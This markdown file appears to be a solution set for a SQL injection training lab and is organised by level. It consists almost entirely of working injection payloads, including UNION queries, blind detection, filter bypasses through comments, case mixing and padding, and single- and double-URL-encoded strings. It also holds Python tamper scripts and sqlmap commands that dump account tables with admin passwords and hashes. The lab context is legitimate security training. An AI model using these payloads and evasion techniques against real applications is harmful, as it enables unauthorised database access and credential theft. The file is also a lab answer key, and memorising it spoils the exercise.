<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# SQL Injection Lab Payloads

* Example SQLi
  * Find the browser with ID = 1

		' UNION SELECT group_concat('|',id,browser,'|') FROM browsers-- -

### Level 2 - How many instances of alienbrowser are there
```sql
# Detection of blind injection
9999' OR substring(database(),1,1)=2#
```

```bash
# sqlmap command
sqlmap -r level2.req --dbms=mysql --technique=B -D 2sqlilabs -T browsers --dump --level=2 --threads 5
```

### Level 3 - find the admin password
```sql
# space filter bypass using comments
'/**/UNION/**/SELECT/**/group_concat('~',username,'|',password,'~')/**/FROM/**/accounts#
```
### Level 4 - Find the amount of columns in the other table
		
1. Get table names (no spaces or comments)

		'UNION(SELECT(group_concat(table_name))FROM(information_schema.columns)WHERE(table_schema=database()))#
		'UNION(SELECT(group_concat(column_name))FROM(information_schema.columns)WHERE(table_name='secretcustomers'))#

### Level 5 - Find how many tables have ELS in their name

		"UNION(SELECT(group_concat(table_name))FROM(information_schema.columns)WHERE(table_schema=database()))#

### Level 6 - Find the GUID of elsboss@els.com

		' UnIoN SeLeCt gRoUp_cOnCaT('~',guid,'|',email,'~') FrOm email;#


* python
```python
#!/usr/bin/python3

# tamper script for easier data retrieval

import sys

def tamper(payload):
  new_payload = ''
  for i in range(len(payload)):
	if i % 2 == 0:
	  new_payload += payload[i].upper()
	else:
	  new_payload += payload[i]
  return new_payload
  
print(tamper(sys.argv[1]))
```

### Level 7 - Find the email with GUID 7EF6514D-1618-8368-B602-BCD92DD820E5

		' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLtZEROFILL ZEROFILLeZEROFILLmZEROFILLaZEROFILLiZEROFILLlZEROFILL ZEROFILLfZEROFILLrZEROFILLoZEROFILLmZEROFILL ZEROFILLeZEROFILLmZEROFILLaZEROFILLiZEROFILLlZEROFILL ZEROFILLwZEROFILLhZEROFILLeZEROFILLrZEROFILLeZEROFILL ZEROFILLgZEROFILLuZEROFILLiZEROFILLdZEROFILL ZEROFILL=ZEROFILL ZEROFILL'ZEROFILL7ZEROFILLEZEROFILLFZEROFILL6ZEROFILL5ZEROFILL1ZEROFILL4ZEROFILLDZEROFILL-ZEROFILL1ZEROFILL6ZEROFILL1ZEROFILL8ZEROFILL-ZEROFILL8ZEROFILL3ZEROFILL6ZEROFILL8ZEROFILL-ZEROFILLBZEROFILL6ZEROFILL0ZEROFILL2ZEROFILL-ZEROFILLBZEROFILLCZEROFILLDZEROFILL9ZEROFILL2ZEROFILLDZEROFILLDZEROFILL8ZEROFILL2ZEROFILL0ZEROFILLEZEROFILL5ZEROFILL'ZEROFILL; ZEROFILL-- ZEROFILL-


```python
#!/usr/bin/python3

import sys

def tamper(payload):
  fill = 'ZEROFILL'
  new_payload = ''
  for i in payload:
	new_payload += i + fill
  return new_payload
  
print(tamper(sys.argv[1]))
```

### Level 8 - Which web browser has 1337 instances
* SQL

		%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%27%7e%27%2c%69%64%2c%27%7c%27%2c%62%72%6f%77%73%65%72%2c%27%7c%27%2c%63%6f%75%6e%74%2c%27%7e%27%29%20%46%52%4f%4d%20%62%72%6f%77%73%65%72%73%2d%2d%20%2d
* bash
sqlmap -u http://8.sqli.labs/ -p user-agent --dbms=mysql --tamper=charencode --level=2 --technique=U -D 8sqlilabs -T browsers --dump

### Level 9 - Find the sha1 hash of elsadmin's password
* SQL

		%25%32%37%25%32%30%25%35%35%25%34%65%25%34%39%25%34%66%25%34%65%25%32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%36%37%25%37%32%25%36%66%25%37%35%25%37%30%25%35%66%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%32%37%25%37%63%25%32%37%25%32%63%25%37%34%25%36%31%25%36%32%25%36%63%25%36%35%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%32%63%25%32%37%25%37%63%25%32%37%25%32%39%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%36%39%25%36%65%25%36%36%25%36%66%25%37%32%25%36%64%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%35%66%25%37%33%25%36%33%25%36%38%25%36%35%25%36%64%25%36%31%25%32%65%25%36%33%25%36%66%25%36%63%25%37%35%25%36%64%25%36%65%25%37%33%25%32%30%25%35%37%25%34%38%25%34%35%25%35%32%25%34%35%25%32%30%25%37%34%25%36%31%25%36%32%25%36%63%25%36%35%25%35%66%25%37%33%25%36%33%25%36%38%25%36%35%25%36%64%25%36%31%25%33%64%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%64%25%32%64%25%32%30%25%32%64
* bash

		sqlmap -u http://9.sqli.labs/ -p user-agent --dbms=mysql --tamper=chardoubleencode --level=2 --technique=U -D 9sqlilabs -T accounts --dump
